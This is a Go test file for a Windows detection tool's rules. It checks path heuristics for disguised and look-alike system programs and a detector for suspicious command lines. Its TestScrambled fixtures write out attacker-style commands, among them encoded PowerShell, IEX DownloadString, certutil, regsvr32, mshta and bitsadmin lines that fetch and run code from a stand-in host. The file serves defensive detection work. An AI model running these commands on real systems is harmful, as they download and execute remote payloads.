package rules

import (
	"testing"

	"lazascope/internal/model"
)

// folders are those of the made-up PC every test uses.
var folders = model.Folders{
	Windows:         `C:\Windows`,
	System:          `C:\Windows\System32`,
	ProgramFiles:    `C:\Program Files`,
	ProgramFilesX86: `C:\Program Files (x86)`,
	ProgramData:     `C:\ProgramData`,
	Users:           `C:\Users`,
	Profile:         `C:\Users\sam`,
	Temp:            `C:\Users\sam\AppData\Local\Temp`,
	Downloads:       `C:\Users\sam\Downloads`,
}

func TestTemporary(t *testing.T) {
	for path, want := range map[string]string{
		`C:\Users\sam\AppData\Local\Temp\setup.exe`:                             "a temporary folder",
		`C:\Users\sam\AppData\Local\Temp\x\y\z.exe`:                             "a temporary folder",
		`C:\Windows\Temp\thing.exe`:                                             "Windows' temporary folder",
		`C:\Users\sam\Downloads\tool.exe`:                                       "the Downloads folder",
		`C:\Users\alex\Downloads\tool.exe`:                                      "a Downloads folder", // another account's
		`C:\Users\alex\AppData\Local\Temp\tool.exe`:                             "a temporary folder",
		`C:\$Recycle.Bin\S-1-5-21\$R1.exe`:                                      "the Recycle Bin",
		`C:\Users\sam\AppData\Local\Microsoft\Windows\INetCache\IE\AB\tool.exe`: "a web browser's cache",
		`C:\Program Files\App\app.exe`:                                          "",
		`C:\Users\sam\AppData\Local\Discord\Update.exe`:                         "",
		`C:\Users\sam\Documents\Downloads.exe`:                                  "", // a file called Downloads, not a folder
		`C:\Users\sam\AppData\Local\Templates\app.exe`:                          "", // only starts like Temp
		`C:\Windows\System32\cmd.exe`:                                           "",
		``:                                                                      "",
	} {
		kind, ok := Temporary(path, folders)
		if kind != want || ok != (want != "") {
			t.Errorf("Temporary(%q) = %q, %v; want %q", path, kind, ok, want)
		}
	}
	// With nothing known about the PC, nothing is called temporary.
	if _, ok := Temporary(`C:\Program Files\App\app.exe`, model.Folders{}); ok {
		t.Error("a PC with no folders named still called a path temporary")
	}
}

func TestUserFolder(t *testing.T) {
	for path, want := range map[string]bool{
		`C:\Users\sam\AppData\Roaming\tool\tool.exe`: true,
		`C:\Users\Public\thing.exe`:                  true,
		`C:\Users`:                                   false,
		`C:\Program Files\App\app.exe`:               false,
		`C:\ProgramData\App\app.exe`:                 false,
		`D:\Users\sam\app.exe`:                       false,
		``:                                           false,
	} {
		if got := UserFolder(path, folders); got != want {
			t.Errorf("UserFolder(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestDisguised(t *testing.T) {
	for path, want := range map[string]bool{
		`C:\Users\sam\Downloads\svchost.exe`:                           true,
		`C:\ProgramData\lsass.exe`:                                     true,
		`C:\Program Files\App\explorer.exe`:                            true,
		`C:\Windows\Temp\cmd.exe`:                                      true, // inside Windows, but in a corner anyone can write to
		`C:\Windows\Tasks\svchost.exe`:                                 true,
		`C:\Windows\System32\spool\drivers\color\dllhost.exe`:          true,
		`D:\Windows\System32\svchost.exe`:                              true, // another disk's Windows folder is not this PC's
		`C:\Windows.old\Windows\System32\svchost.exe`:                  true,
		`C:\Windows\System32\svchost.exe`:                              false,
		`C:\WINDOWS\system32\SVCHOST.EXE`:                              false,
		`C:\Windows\explorer.exe`:                                      false,
		`C:\Windows\SysWOW64\rundll32.exe`:                             false,
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`:    false,
		`C:\Windows\WinSxS\amd64_microsoft-windows-x_31bf\conhost.exe`: false,
		`C:\Windows\ImmersiveControlPanel\SystemSettings.exe`:          false,
		`C:\Program Files\App\app.exe`:                                 false,
		`C:\Program Files\App\svchost.dll`:                             false, // only programs count
		`C:\Program Files\App\svchost.exe.txt`:                         false,
		`svchost.exe`:                                                  false, // no place given, so nothing to say about its place
	} {
		if got := Disguised(path, folders); got != want {
			t.Errorf("Disguised(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestLookalike(t *testing.T) {
	for path, want := range map[string]string{
		`C:\Users\sam\svch0st.exe`:          "svchost.exe", // a zero for an o
		`C:\Users\sam\scvhost.exe`:          "svchost.exe", // two letters swapped
		`C:\Users\sam\svchosts.exe`:         "svchost.exe", // a letter added
		`C:\Users\sam\svhost.exe`:           "svchost.exe", // a letter dropped
		`C:\Users\sam\1sass.exe`:            "lsass.exe",   // a one for an l
		`C:\Users\sam\Isass.exe`:            "lsass.exe",   // a capital i for an l
		`C:\Users\sam\expl0rer.exe`:         "explorer.exe",
		`C:\Users\sam\explorerr.exe`:        "explorer.exe",
		`C:\Users\sam\winlogin.exe`:         "winlogon.exe",
		`C:\Users\sam\csrsss.exe`:           "", // a short name: only look-alike letters count
		`C:\Users\sam\rundl132.exe`:         "rundll32.exe",
		`C:\Users\sam\dllhost.scr`:          "", // the same name is a matter for Disguised
		`C:\Windows\System32\svchost.exe`:   "",
		`C:\Windows\System32\taskhost.exe`:  "", // one letter from taskhostw, but a real part of Windows
		`C:\Program Files\App\sass.exe`:     "", // one letter from lsass, and an honest program
		`C:\Program Files\App\service.exe`:  "",
		`C:\Program Files\App\iexplore.exe`: "",
		`C:\Windows\System32\wininet.dll`:   "", // one letter from wininit, and an honest library
		`C:\Program Files\App\explorer.txt`: "",
		`C:\Program Files\App\host.exe`:     "",
		`C:\Program Files\App\app.exe`:      "",
	} {
		of, ok := Lookalike(path)
		if of != want || ok != (want != "") {
			t.Errorf("Lookalike(%q) = %q, %v; want %q", path, of, ok, want)
		}
	}
}

func TestNearly(t *testing.T) {
	for _, test := range []struct {
		a, b string
		want bool
	}{
		{"svchost", "svchost", false},
		{"svchost", "svchosx", true},
		{"svchost", "scvhost", true},
		{"svchost", "svchostt", true},
		{"svchost", "xsvchost", true},
		{"svchost", "svhost", true},
		{"svchost", "sxchosx", false},
		{"svchost", "vschots", false},
		{"svchost", "svchostxx", false},
		{"ab", "ba", true},
		{"abc", "cba", false},
	} {
		if got := nearly(test.a, test.b); got != test.want {
			t.Errorf("nearly(%q, %q) = %v, want %v", test.a, test.b, got, test.want)
		}
		if got := nearly(test.b, test.a); got != test.want {
			t.Errorf("nearly(%q, %q) = %v, want %v", test.b, test.a, got, test.want)
		}
	}
}

func TestScrambled(t *testing.T) {
	const powershell = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	const cmd = `C:\Windows\System32\cmd.exe`
	for _, test := range []struct {
		program, command string
		signs            int
	}{
		// What attackers write.
		{powershell, `powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`, 1},
		{powershell, `powershell -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==`, 1},
		{powershell, `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"`, 2},
		{powershell, `powershell -Command "$d=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA');[Reflection.Assembly]::Load($d)"`, 1},
		{powershell, `powershell "I` + "`" + `E` + "`" + `X ('Down'+'load'+'Str'+'ing')"`, 3},
		{cmd, `cmd /c p^o^w^e^r^s^h^e^l^l -c calc`, 1},
		{cmd, `cmd.exe /c certutil -urlcache -split -f http://203.0.113.5/x.exe %TEMP%\x.exe & %TEMP%\x.exe`, 1},
		{cmd, `cmd /c %COMSPEC:~0,1%md /c whoami`, 1},
		{`C:\Windows\System32\mshta.exe`, `mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")`, 1},
		{`C:\Windows\System32\mshta.exe`, `mshta https://example.com/run.hta`, 1},
		{`C:\Windows\System32\rundll32.exe`, `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()`, 1},
		{`C:\Windows\System32\regsvr32.exe`, `regsvr32 /s /n /u /i:http://203.0.113.5/file.sct scrobj.dll`, 2},
		{`C:\Windows\System32\msiexec.exe`, `msiexec /q /i http://203.0.113.5/a.msi`, 1},
		{`C:\Windows\System32\bitsadmin.exe`, `bitsadmin /transfer job http://203.0.113.5/a.exe C:\a.exe`, 1},

		// What honest software writes.
		{powershell, `powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Program Files\App\update.ps1"`, 0},
		{powershell, `powershell -ep bypass -w hidden -file C:\Scripts\backup.ps1 -Target D:\`, 0},
		{powershell, `powershell.exe -Command "Get-ScheduledTask | Export-Csv C:\tasks.csv"`, 0},
		{cmd, `cmd.exe /c start "" "C:\Program Files\App\app.exe" --minimised`, 0},
		{cmd, `cmd /c "C:\Tools\backup.bat" > C:\Logs\backup.log 2>&1`, 0},
		{`C:\Windows\System32\rundll32.exe`, `rundll32.exe "C:\Program Files\Thing\thing.dll",Start`, 0},
		{`C:\Windows\System32\rundll32.exe`, `rundll32.exe shell32.dll,Control_RunDLL`, 0},
		{`C:\Windows\System32\regsvr32.exe`, `regsvr32 /s "C:\Program Files\Thing\thing.dll"`, 0},
		{`C:\Windows\System32\msiexec.exe`, `msiexec /i "C:\Apps\setup.msi" /qn`, 0},
		{`C:\Windows\System32\wscript.exe`, `wscript.exe "C:\Scripts\start.vbs"`, 0},
		// Other programs are not judged by this at all, whatever their command.
		{`C:\Program Files\Mozilla Firefox\firefox.exe`, `firefox.exe -contentproc -prefsHandle 1234 -initialChannelId {e2a3bed9-137d-49a9-b01b-651000000000} http://example.com`, 0},
		{`C:\Program Files\App\app.exe`, `app.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`, 0},
		{``, ``, 0},
	} {
		if signs := Scrambled(test.program, test.command); len(signs) != test.signs {
			t.Errorf("%s\n   got %d signs %q, want %d", test.command, len(signs), signs, test.signs)
		}
	}
}

func TestBlob(t *testing.T) {
	long := "TVqQAAMAAAAEAAAAaGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmxvY2sgb2YgZW5jb2RlZCB0ZXh0IHRoYXQgZ29lcyBvbiBhbmQgb24="
	if !blob(`powershell -c "$x='` + long + `'"`) {
		t.Error("a long block of encoded text was not seen")
	}
	for _, plain := range []string{
		`powershell -File "C:\Program Files\A Very Long Folder Name Indeed\Another Long Folder Name\And One More For Good Measure\script.ps1"`,
		`cmd /c echo 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef`,
		`cmd /c echo short`,
	} {
		if blob(plain) {
			t.Errorf("taken for encoded text: %s", plain)
		}
	}
}

func TestHidden(t *testing.T) {
	const powershell = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	for command, want := range map[string]bool{
		`powershell -WindowStyle Hidden -File a.ps1`: true,
		`powershell -w hidden -c calc`:               true,
		`powershell -win h -c calc`:                  true,
		`powershell -w 1 -c calc`:                    true,
		`powershell -File a.ps1`:                     false,
		`powershell -WindowStyle Normal -File a.ps1`: false,
		`powershell -w`:                              false,
	} {
		if got := Hidden(powershell, command); got != want {
			t.Errorf("Hidden(%s) = %v, want %v", command, got, want)
		}
	}
	if !Hidden(`C:\Windows\System32\conhost.exe`, `conhost.exe --headless powershell -File a.ps1`) {
		t.Error("conhost --headless shows no window")
	}
	if Hidden(`C:\Program Files\App\app.exe`, `app.exe -w hidden`) {
		t.Error("only scripting tools are judged")
	}
}

func TestScript(t *testing.T) {
	for path, want := range map[string]bool{
		`C:\Users\sam\run.bat`:            true,
		`C:\Users\sam\RUN.CMD`:            true, // the ending counts whatever its case
		`C:\ProgramData\x\start.vbs`:      true,
		`C:\ProgramData\x\job.ps1`:        true,
		`C:\ProgramData\x\page.hta`:       true,
		`C:\Users\sam\Documents\sync.mjs`: true,
		`C:\Users\sam\keys.ahk`:           true,
		`C:\Users\sam\notes.txt`:          false,
		`C:\Users\sam\tool.exe`:           false,
		`C:\Users\sam\library.dll`:        false,
		`C:\Users\sam\setup.msi`:          false,
		`C:\Users\sam\noending`:           false,
		`C:\Users\sam\folder.bat\tool`:    false, // the ending of a folder is not the file's
		``:                                false,
	} {
		if got := Script(path); got != want {
			t.Errorf("Script(%q) = %v, want %v", path, got, want)
		}
	}
	for path, want := range map[string]bool{
		`C:\Users\sam\svc.vbe`: true,
		`C:\Users\sam\svc.JSE`: true,
		`C:\Users\sam\svc.vbs`: false,
		`C:\Users\sam\svc.js`:  false,
		`C:\Users\sam\svc.exe`: false,
	} {
		if got := EncodedScript(path); got != want {
			t.Errorf("EncodedScript(%q) = %v, want %v", path, got, want)
		}
		if want && !Script(path) {
			t.Errorf("%q is an encoded script and is not counted as a script", path)
		}
	}
}

func TestProtected(t *testing.T) {
	for path, want := range map[string]bool{
		`C:\Windows\System32\gatherNetworkInfo.vbs`: true,
		`C:\Program Files\Notes\tidy.ps1`:           true,
		`C:\Program Files (x86)\Printer\tray.vbs`:   true,
		`C:\Windows\Temp\run.bat`:                   false, // a corner of Windows anyone can write to
		`C:\Windows\Tasks\run.bat`:                  false,
		`C:\ProgramData\upd\run.vbs`:                false,
		`C:\Users\sam\AppData\Roaming\run.vbs`:      false,
		`C:\Program Files Extra\run.bat`:            false, // only looks like Program Files
		`C:\Scripts\login.bat`:                      false,
		`D:\Program Files\App\run.bat`:              false, // a folder of that name on another disk is not the protected one
		``:                                          false,
	} {
		if got := Protected(path, folders); got != want {
			t.Errorf("Protected(%q) = %v, want %v", path, got, want)
		}
	}
	// With nothing known about the PC, nothing is taken to be protected.
	if Protected(`C:\Program Files\App\run.bat`, model.Folders{}) {
		t.Error("a file was taken to be protected on a PC whose folders are not known")
	}
}
